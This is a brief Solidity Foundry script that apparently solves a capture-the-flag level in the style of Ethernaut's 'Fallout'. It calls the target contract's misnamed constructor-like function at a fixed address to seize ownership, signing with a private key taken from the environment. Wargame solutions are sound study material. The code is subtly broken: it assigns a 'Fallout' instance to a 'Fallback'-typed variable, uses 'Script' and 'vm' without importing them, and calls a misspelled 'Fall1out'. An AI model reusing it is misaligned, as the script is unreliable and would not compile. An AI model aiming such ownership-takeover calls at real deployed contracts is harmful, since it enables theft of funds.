// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallout} from "./Fallout.sol";

contract FallbackSolution is Script {
    Fallback public falloutInstance = Fallout(0x6b32930B4933B22B909DD13D4CB9EF748bB7744E);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        falloutInstance.Fall1out();

        vm.stopBroadcast();
    }
}
